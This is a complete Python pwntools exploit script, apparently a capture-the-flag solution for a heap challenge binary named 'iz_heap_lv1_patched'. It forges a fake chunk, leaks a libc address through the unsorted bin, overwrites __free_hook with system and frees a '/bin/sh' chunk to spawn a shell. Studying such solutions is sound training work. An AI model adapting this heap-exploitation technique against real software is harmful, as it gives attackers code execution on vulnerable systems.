#!/usr/bin/python3

from pwn import *

exe = ELF("./iz_heap_lv1_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x400df5
        c
        ''')
        input()

def add(size, data):
    sla(b'Choice: ', b'1')
    sna(b'size: ', size)
    sa(b'data: ', data)

def edit(idx, size, data):
    sla(b'Choice: ', b'2')
    sna(b'index: ', idx)
    sna(b'size: ', size)
    sa(b'data: ', data)

def dell(idx):
    sla(b'Choice: ', b'3')
    sna(b'index: ', idx)

def show(choose, name):
    sla(b'Choice: ', b'4')
    sa(b'edit: (Y/N)', choose)
    if choose == b'Y':
        sa(b'name: ', name)

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()
sa(b'Input name: ', p64(0x602120) + b'\0'*16 + p64(0x91) + b'\0'*0x88 + p64(0x21) + b'\0' * 0x18 + p64(0x21))
for i in range(7):
    add(0x7f, b'a'*0x7f)
for i in range(7):
    dell(i)
dell(20)
show(b'Y', b'a'*32)
p.recvuntil(b'a'*32)
main_arena = u64(p.recv(6) + b'\0\0')
log.info(f"main_arena: {hex(main_arena)}")
libc.address = main_arena - 0x3ebca0
log.info(f"libc base: {hex(libc.address)}")

add(0x7f, b'/bin/sh\0')
show(b'Y', p64(0x602120) + b'\0'*16 + p64(0x91) + b'\0'*0x88 + p64(0x21) + b'\0' * 0x18 + p64(0x21))
dell(20)
show(b'Y', b'a'*24 + p64(0x91) + p64(libc.sym.__free_hook))
add(0x7f, b'a'*0x7f)
add(0x7f, p64(libc.sym.system))
dell(0)
p.interactive()

